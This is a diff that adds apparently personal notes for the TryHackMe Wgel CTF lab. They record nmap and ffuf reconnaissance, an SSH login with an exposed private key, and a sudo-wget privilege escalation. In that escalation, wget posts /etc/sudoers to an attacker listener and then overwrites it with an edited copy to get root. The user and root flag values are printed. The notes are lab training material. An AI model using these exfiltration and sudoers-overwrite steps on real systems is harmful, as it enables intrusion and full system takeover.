@@ -1,0 +1,138 @@
+nmap -sSVC -Pn -vv 10.10.75.192
+
+
+ffuf -u http://10.10.75.192/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,301
+
+sitemap                 [Status: 301, Size: 314, Words: 20, Lines: 10]
+                        [Status: 200, Size: 11374, Words: 3512, Lines: 379]
+
+
+ffuf -u http://10.10.75.192/sitemap/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,301
+
+.ssh                    [Status: 301, Size: 319, Words: 20, Lines: 10]
+                        [Status: 200, Size: 21080, Words: 1305, Lines: 517]
+css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
+fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10]
+images                  [Status: 301, Size: 321, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 21080, Words: 1305, Lines: 517]
+js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
+:: Progress: [4614/4614] :: Job [1/1] :: 194 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
+
+Jessie
+
+view-source:http://10.10.75.192/
+
+
+<!-- Jessie don't forget to udate the webiste -->
+
+chmod 600 id_rsa.txt
+ssh -i id_rsa.txt jessie@10.9.12.213
+cat Documents/user_flag.txt
+057c67131c3d5e42dd5cd3075b198ff6
+
+
+sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin       
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+
+#on my machine
+ncat -lnvp 4445
+
+on target
+sudo wget --post-file=/etc/sudoers 10.9.12.213:4445
+
+on my machine
+ncat -lnvp 4445
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+Ncat: Connection from 10.10.75.192.
+Ncat: Connection from 10.10.75.192:58710.
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.11.52.16:4445
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 797
+
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+jessie  ALL=(root) NOPASSWD: /usr/bin/wget
+
+
+
+
+on my machine
+https://github.com/maditnerd/WinSimpleHTTP
+https://github.com/maditnerd/WinSimpleHTTP/releases/download/1.1/web.exe
+
+vi sudoers
+#change 
+jessie  ALL=(root) NOPASSWD: /usr/bin/wget
+to
+jessie  ALL=(root) NOPASSWD: ALL
+####
+
+f:/thm/web.exe
+
+on target
+cd /etc
+sudo wget http://10.11.52.16:8000/sudoers --output-document=sudoers
+
+sudo -l
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: ALL
+
+
+sudo su
+cat /root/root_flag.txt
+b1b968b37519ad1daa6408188649263d
+
+
+
+https://github.com/maditnerd/WinSimpleHTTP
+
+https://tryhackme.com/room/wgelctf
+https://kartibok.github.io/Capture-the-Flag/tryhackme/wgelCTF.html
+https://gtfobins.github.io/gtfobins/wget/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+
